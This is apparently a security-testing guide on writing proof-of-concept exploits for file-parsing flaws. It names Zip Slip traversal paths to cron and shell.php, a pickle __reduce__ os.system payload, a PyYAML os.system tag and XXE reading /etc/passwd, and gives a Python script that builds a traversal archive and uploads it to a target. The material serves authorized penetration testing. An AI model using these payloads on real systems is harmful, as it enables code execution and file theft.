# PoC Guide: Local File / Archive / Parsing Vulnerabilities

Use this when a finding is **Critical** or **High** and involves file parsing, archive extraction, or local exploitation (not triggered via a direct HTTP request to inject a payload).

## When to use

- Zip Slip / archive traversal, deserialization via file (pickle files, YAML config, Java serialized objects), XXE via file upload, insecure file upload leading to code execution, symlink extraction issues.

## What to ask the user

| What to ask | Example / notes |
|-------------|------------------|
| **How the file reaches the vulnerable code** | Upload endpoint, file watcher, queue consumer, CLI argument, config file |
| **File format** | ZIP, TAR, YAML, XML, pickle, Java serialized, PDF, etc. |
| **Extraction or parsing method** | Which library/function processes the file |
| **Writable directory** | Where extracted/parsed files are written; are they web-accessible? |
| **Execution context** | What user/process handles the file; are there sandboxing or permission restrictions? |

## Workflow

1. **Craft the malicious file** in Python:
   - Zip Slip: create a ZIP with entry path `../../etc/cron.d/pwn` or `../../app/shell.php`.
   - Pickle RCE: `pickle.dumps` with `__reduce__` returning `os.system` call.
   - YAML: `!!python/object/apply:os.system ['id']` for unsafe PyYAML loader.
   - XXE: XML file with external entity pointing to `/etc/passwd` or internal URL.
2. **Deliver the file** to the target (upload, place on filesystem, submit to queue).
3. **Verify exploitation**: check for file written to unexpected location, command output, callback, or error message revealing success.

## Python script structure

```python
#!/usr/bin/env python3
"""PoC: [finding title]. Authorized testing only."""

import zipfile  # or tarfile, pickle, yaml, xml, etc.
import io
import sys

def create_malicious_file():
    """Create the crafted file in memory or on disk."""
    # Zip Slip example:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('../../tmp/pwned.txt', 'PoC: Zip Slip successful')
    buf.seek(0)
    return buf

def deliver(file_data, target):
    """Upload or place the file. Adjust per target."""
    import requests
    resp = requests.post(f"{target}/upload", files={"file": ("test.zip", file_data)})
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text[:500]}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    malicious = create_malicious_file()
    deliver(malicious, target)
```

Adapt the `create_malicious_file` function per vulnerability type. Keep delivery separate so it can be swapped (HTTP upload, file copy, queue publish).
